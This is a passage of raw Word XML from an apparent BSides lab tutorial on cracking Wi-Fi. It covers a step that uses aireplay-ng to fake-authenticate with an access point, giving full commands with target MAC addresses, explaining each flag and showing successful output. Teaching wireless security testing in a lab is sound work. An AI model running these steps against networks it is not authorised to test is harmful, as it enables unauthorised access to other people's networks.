          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Packets  Probes                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAF2B8B" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="002E6DDC" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E2681B5" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  00:0F:B5:88:AC:82   42     0   183782</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1C29F6" w14:textId="77777777" w:rsidR="002E6DDC" w:rsidRDefault="002E6DDC" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="264AF3AB" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 4 - Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aireplay-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to do a fake authentication with the access point</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="029132D1" w14:textId="77777777" w:rsidR="00826FDB" w:rsidRDefault="00826FDB" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D289FAA" w14:textId="0AD98B79" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="00C7451C">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 xml:space="preserve">In order for an access point to accept a packet, the source MAC address must already be associated. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17573C24" w14:textId="77777777" w:rsidR="00826FDB" w:rsidRDefault="00826FDB" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A822521" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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To associate with an access point, use fake authentication:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E3382A" w14:textId="77777777" w:rsidR="00826FDB" w:rsidRDefault="00826FDB" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DD7642A" w14:textId="32D8E3DD" w:rsidR="002B7D39" w:rsidRPr="002D638E" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -1 0 -e </w:t>
      </w:r>
      <w:r w:rsidR="007E5CF0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 </w:t>
      </w:r>
      <w:r w:rsidR="00E45DB9" w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01EE5B62" w14:textId="77777777" w:rsidR="00826FDB" w:rsidRDefault="00826FDB" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B2A7ECA" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284EFC00" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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-1 means fake authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79266623" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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 xml:space="preserve">0 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>reassociation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> timing in seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51293A42" w14:textId="373687A2" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007E5CF0">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless network name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35ACE565" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E9315A" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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00:0F:B5:88:AC:82 is our card MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4117257C" w14:textId="431CE10A" w:rsidR="002B7D39" w:rsidRDefault="00E45DB9" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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sidR="002B7D39">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="303473F4" w14:textId="77777777" w:rsidR="00826FDB" w:rsidRDefault="00826FDB" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3005CD15" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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Success looks like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69995998" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00826FDB" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:18:20  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0F1A8C" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00826FDB" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:18:20  Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7A5024" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00826FDB" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:18:20  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68614267" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00826FDB" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:18:20  Association</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful :-)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763D54A3" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00826FDB" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Or another variation for picky access points:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E4EEA6" w14:textId="4DAB64CF" w:rsidR="002B7D39" w:rsidRPr="00826FDB" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> -1 6000 -o 1 -q 10 -e </w:t>
      </w:r>
      <w:r w:rsidR="007E5CF0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 </w:t>
      </w:r>
      <w:r w:rsidR="00E45DB9" w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA40C7A" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00826FDB" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067F8AAD" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00826FDB" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">6000 - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Reauthenticate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> every 6000 seconds. The long period also causes keep alive packets to be sent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F7C6F8" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00826FDB" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
